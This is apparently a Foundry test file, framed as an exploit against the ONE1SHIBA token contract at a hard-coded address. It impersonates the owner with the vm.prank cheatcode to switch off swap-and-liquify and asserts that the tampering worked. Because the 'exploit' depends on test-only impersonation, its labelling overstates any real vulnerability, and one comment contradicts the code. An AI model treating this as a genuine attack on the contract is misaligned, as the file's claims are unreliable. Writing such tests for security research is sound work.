// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ONE1SHIBA {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // First, we need to get the current owner address
        address owner = ONE1SHIBA(TARGET).owner();

        // Impersonate the owner and call setSwapAndLiquifyEnabled(false)
        vm.prank(owner);
        ONE1SHIBA(TARGET).setSwapAndLiquifyEnabled(false);

        // Verify the exploit worked
        bool swapEnabled = ONE1SHIBA(TARGET).swapAndLiquifyEnabled();
        require(swapEnabled == false, "Exploit failed: swapAndLiquifyEnabled should be false");
        assertEq(swapEnabled, false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

